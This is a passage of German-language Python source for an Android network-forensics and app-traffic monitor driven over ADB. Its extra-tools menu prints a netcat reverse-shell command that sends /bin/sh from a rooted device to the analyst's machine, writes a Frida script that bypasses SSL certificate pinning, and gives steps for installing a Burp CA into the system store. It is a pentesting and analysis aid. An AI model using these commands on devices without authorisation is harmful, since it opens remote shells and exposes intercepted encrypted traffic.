                "Content-Security-Policy":   ("CSP", ui.BGREEN),
                "X-Frame-Options":           ("XFO", ui.BGREEN),
                "X-Content-Type-Options":    ("XCTO", ui.BGREEN),
                "X-XSS-Protection":          ("XSS", ui.BYELLOW),
            }
            print(f"\n  {ui.BOLD}Sicherheits-Header:{ui.RESET}")
            for h, (short, col) in sec_headers.items():
                found = h.lower() in headers.lower()
                mark = f"{col}✓{ui.RESET}" if found else f"{ui.BRED}✗{ui.RESET}"
                print(f"  {mark}  {short} ({h})")
            ui.pause()

        # ── 8: netcat ─────────────────────────────────────────────────────────
        elif ch == "8":
            ui.clear()
            ui.rule("🔌 netcat Port-Listener", ui.BCYAN)
            print(f"\n  {ui.BOLD}Port eingeben (z.B. 4444):{ui.RESET} ", end="")
            try:
                port_str = input().strip()
            except (EOFError, KeyboardInterrupt):
                port_str = "4444"
            port_str = port_str or "4444"

            kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'").strip()
            print(f"\n  {ui.BOLD}Listener starten auf Port {port_str}:{ui.RESET}")
            print(f"  {ui.GREY}nc -lvnp {port_str}{ui.RESET}\n")
            print(f"  {ui.BOLD}Gerät verbinden (via ADB):{ui.RESET}")
            print(f"  {ui.GREY}adb shell nc {kali_ip} {port_str}{ui.RESET}\n")
            print(f"  {ui.BOLD}Oder Gerät→Kali Reverse-Shell (Root):{ui.RESET}")
            print(f"  {ui.GREY}adb shell \"su -c 'nc {kali_ip} {port_str} -e /bin/sh'\"{ui.RESET}\n")
            if ui.confirm("Listener jetzt starten?", False):
                print(f"\n  {ui.GREY}Starte nc -lvnp {port_str} …  (Ctrl+C zum Beenden){ui.RESET}\n")
                try:
                    subprocess.run(f"nc -lvnp {port_str}", shell=True)
                except KeyboardInterrupt:
                    pass
            ui.pause()

        # ── 9: Frida HTTPS-Unpinning ──────────────────────────────────────────
        elif ch == "9":
            ui.clear()
            ui.rule("🎯 Frida HTTPS-SSL-Unpinning", ui.BCYAN)
            has_frida = _which("frida")
            has_frida_server = bool(adb.shell(
                "ls /data/local/tmp/frida-server 2>/dev/null").strip())

            print(f"  frida (Host):    {'✓' if has_frida else '✗'}")
            print(f"  frida-server (Gerät): {'✓' if has_frida_server else '✗'}\n")

            if not has_frida:
                print(f"  {ui.GREY}Installieren: pip install frida-tools{ui.RESET}")

            print(f"  {ui.BOLD}SSL-Pinning umgehen (universelles Script):{ui.RESET}")
            frida_script = '''
Java.perform(function() {
  // OkHttp3 CertificatePinner bypass
  try {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function() {
      console.log("[Frida] OkHttp3 SSL Pinning bypassed");
    };
  } catch(e) {}
  // TrustManager bypass
  try {
    var TrustManager = [{
      checkClientTrusted: function(a,b){},
      checkServerTrusted: function(a,b){},
      getAcceptedIssuers: function(){ return []; }
    }];
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    SSLContext.init.implementation = function(a, TrustManager, c) {
      SSLContext.init.call(this, a, TrustManager, c);
      console.log("[Frida] SSLContext.init hooked");
    };
  } catch(e) {}
  console.log("[Frida] SSL-Unpinning aktiv");
});'''
            script_path = os.path.join(OUT, "ssl_unpin.js")
            with open(script_path, "w") as f:
                f.write(frida_script)
            print(f"  {ui.GREY}{frida_script[:400]}{ui.RESET}")
            print(f"\n  Script gespeichert: {script_path}")
            print(f"\n  {ui.BOLD}Starten mit:{ui.RESET}")
            print(f"  {ui.GREY}frida -U -f com.TARGET.app -l {script_path} --no-pause{ui.RESET}")
            print(f"  {ui.GREY}frida -U -n APPNAME -l {script_path}{ui.RESET}")
            print(f"\n  {ui.BOLD}Alle laufenden Apps:{ui.RESET}")
            if has_frida and has_frida_server:
                apps = _run("frida-ps -U 2>/dev/null | head -20", timeout=8)
                print(f"  {ui.GREY}{apps}{ui.RESET}")
            ui.pause()

        # ── 10: Burp Suite Setup ──────────────────────────────────────────────
        elif ch == "10":
            ui.clear()
            ui.rule("🏗  Burp Suite Android-Setup", ui.BCYAN)
            kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'").strip()
            print(f"""
  {ui.BOLD}Komplette Anleitung: Android → Burp Suite (Kali){ui.RESET}

  {ui.BOLD}1. Burp Suite starten + Proxy konfigurieren:{ui.RESET}
  {ui.GREY}  Burp → Proxy → Options → Add → Port 8080, Interface {kali_ip}{ui.RESET}

  {ui.BOLD}2. Gerät-Proxy setzen:{ui.RESET}
  {ui.GREY}  adb shell settings put global http_proxy {kali_ip}:8080{ui.RESET}

  {ui.BOLD}3. Burp CA-Cert herunterladen und installieren:{ui.RESET}
  {ui.GREY}  # Im Gerät-Browser: http://burpsuite → Cert herunterladen
  # Oder via Burp: Proxy → Options → Export CA certificate
  adb push burp-ca.der /data/local/tmp/burp-ca.der
  # Gerät: Einstellungen → Sicherheit → CA-Zertifikat → Datei installieren{ui.RESET}

  {ui.BOLD}4. adb-Port-Forward (Gerät→Kali):{ui.RESET}
  {ui.GREY}  adb reverse tcp:8080 tcp:8080{ui.RESET}

  {ui.BOLD}5. Für System-Apps (Root):{ui.RESET}
  {ui.GREY}  # CA in System-Store installieren:
  openssl x509 -inform DER -in burp-ca.der -out burp-ca.pem
  HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1)
  cp burp-ca.pem $HASH.0
  adb push $HASH.0 /system/etc/security/cacerts/
  adb shell chmod 644 /system/etc/security/cacerts/$HASH.0{ui.RESET}

  {ui.BOLD}6. SSL-Pinning umgehen → Option 9 (Frida){ui.RESET}

  {ui.BOLD}7. Proxy wieder entfernen:{ui.RESET}
  {ui.GREY}  adb shell settings delete global http_proxy{ui.RESET}
""")
            ui.pause()

        # ── 11: Fehlende Tools installieren ───────────────────────────────────
        elif ch == "11":
            ui.clear()
            ui.rule("📦 Fehlende Tools installieren", ui.BCYAN)
            missing_apt = [t for t in ["mitmproxy", "tshark", "nmap", "arp-scan"]
                           if not tools_status.get(t)]
            missing_pip = [t for t in ["frida-tools"] if not tools_status.get("frida")]

            if not missing_apt and not missing_pip:
                ui.ok("Alle Tools sind bereits installiert!")
            else:
                if missing_apt:
                    print(f"\n  {ui.BOLD}Apt-Pakete installieren:{ui.RESET}")
                    cmd = f"sudo apt install -y {' '.join(missing_apt)}"
                    print(f"  {ui.GREY}{cmd}{ui.RESET}")
                    if ui.confirm("Jetzt installieren?", True):
                        result = _run(cmd, timeout=300)
                        print(result[:2000])
                if missing_pip:
                    print(f"\n  {ui.BOLD}Pip-Pakete:{ui.RESET}")
                    pip_cmd = f"pip install {' '.join(missing_pip)}"
                    print(f"  {ui.GREY}{pip_cmd}{ui.RESET}")
                    if ui.confirm("Jetzt installieren?", True):
                        result = _run(pip_cmd, timeout=120)
                        print(result[:1000])
            # Status aktualisieren
            tools_status.update({t: _which(t) for t in tools_status})
            ui.pause()

        # ── 12: adb-Reverse-Proxy ─────────────────────────────────────────────
        elif ch == "12":
            ui.clear()
            ui.rule("🔄 adb-Reverse-Proxy Einrichtung", ui.BCYAN)
            kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'").strip()
            print(f"\n  {ui.BOLD}Kali-IP: {kali_ip}{ui.RESET}\n")
            print(f"  {ui.BOLD}Schritt 1 – adb reverse (Gerät→Kali Port-Forward):{ui.RESET}")
            result1 = adb.shell("echo 'ADB aktiv'")
            print(f"  {ui.GREY}adb reverse tcp:8080 tcp:8080{ui.RESET}")
            rev_result = _run("adb reverse tcp:8080 tcp:8080 2>&1", timeout=10)
            print(f"  {ui.GREY}→ {rev_result or 'OK'}{ui.RESET}")
            print(f"\n  {ui.BOLD}Schritt 2 – Gerät-Proxy auf localhost setzen:{ui.RESET}")
            print(f"  {ui.GREY}adb shell settings put global http_proxy 127.0.0.1:8080{ui.RESET}")
            proxy_result = _run("adb shell settings put global http_proxy 127.0.0.1:8080 2>&1", timeout=8)
            if not proxy_result or proxy_result == "":
                ui.ok("Proxy gesetzt: 127.0.0.1:8080")
            else:
                print(f"  {ui.GREY}{proxy_result}{ui.RESET}")
            print(f"\n  {ui.BOLD}Schritt 3 – mitmproxy / Burp auf Port 8080 starten{ui.RESET}")
            print(f"  {ui.GREY}Jetzt mitmproxy/Burp auf Kali starten → Option 1{ui.RESET}")
            print(f"\n  {ui.BOLD}Rückgängig machen:{ui.RESET}")
            print(f"  {ui.GREY}adb shell settings delete global http_proxy")
            print(f"  adb reverse --remove tcp:8080{ui.RESET}")
            ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  HAUPTMENÜ (15 Optionen)
# ═══════════════════════════════════════════════════════════════════════════════

def menu(adb: ADB, dev=None, st=None, data=None) -> None:
    """App-Domain Monitor – Hauptmenü (14 Optionen)."""
    while True:
        ui.clear()
        ui.banner(subtitle="🌐 APP-DOMAIN MONITOR – Vollständige Netzwerk-Forensik")
        print(f"  {ui.GREY}Echtzeit-DNS · App-Traffic · Tracker · Geolokalisierung · PII · Forensik{ui.RESET}\n")
        ch = ui.menu("Aktion (1-14)", [
            ("1",  f"{ui.BRED}{ui.BOLD}🔴 LIVE DNS/Domain Monitor{ui.RESET}  "
                   f"(Echtzeit · Apps · Domains · Heartbeat-Alarm)"),
            ("2",  "📊 App-Netzwerk-Statistik      (Traffic/Bytes/Pakete pro App · sortierbar)"),
            ("3",  "🚫 Blacklist-Check             (200+ Tracker/Malware · Sofort-Alarm)"),
            ("4",  "🗂️  DNS-Cache Dump             (Server · Props · /proc/net · Root)"),
            ("5",  "📱 Pro-App Domain-Profil       (alle Domains+Subdomains je App)"),
            ("6",  "📅 Domain-Timeline             (Zeitverlauf · Filter · CSV-Export)"),
            ("7",  "🔒 Domain-Blocker              (/etc/hosts · NetworkPolicy · DNS-Empfehlung)"),
            ("8",  "🌍 IP-Geolokalisierung         (Reverse-DNS · Org · Land · Verbindungen)"),
            ("9",  "🔐 TLS/SSL Inspector           (Versionen · Zertifikat-Fehler · MITM-Risiko)"),
            ("10", "🌐 Internet-Permission-Scan    (welche Apps dürfen ins Netz · Risiko-Score)"),
            ("11", "🔍 PII-Leak-Detektor           (IMEI · GPS · E-Mail · UUID in DNS/HTTP)"),
            ("12", "📡 Tiefen-Traffic-Capture      (tcpdump/PCAP · logcat 60s · Netz-Snapshot)"),
            ("13", f"{ui.BCYAN}{ui.BOLD}🗂️  Forensik-Komplett-Bericht  (alle Checks · Risiko-Score · Export){ui.RESET}"),
            ("14", "📁 Alles speichern             (Vollexport JSON+TXT+netstats+DNS)"),
            ("15", f"{ui.BYELLOW}{ui.BOLD}🛠️  EXTRA TOOLS                 (mitmproxy·tshark·nmap·openssl·arp·Burp){ui.RESET}"),
        ], back_label="Hauptmenü")
        if ch in ("back", "quit"):
            return
        try:
            dispatch = {
                "1":  live_domain_monitor,
                "2":  app_network_history,
                "3":  domain_blacklist_check,
                "4":  dns_cache_dump,
                "5":  per_app_domain_profile,
                "6":  domain_timeline,
                "7":  domain_blocker,
                "8":  ip_geolocate,
                "9":  tls_inspector,
                "10": internet_permission_scan,
                "11": pii_leak_detector,
                "12": deep_traffic_capture,
                "13": full_forensics_report,
                "14": export_all,
                "15": extra_tools,
            }
            fn = dispatch.get(ch)
            if fn:
                fn(adb, dev, st, data)
        except Exception as e:  # noqa: BLE001
            ui.err(f"Fehler: {e}")
            LOG.exception("app_traffic_monitor", e)
            ui.pause()
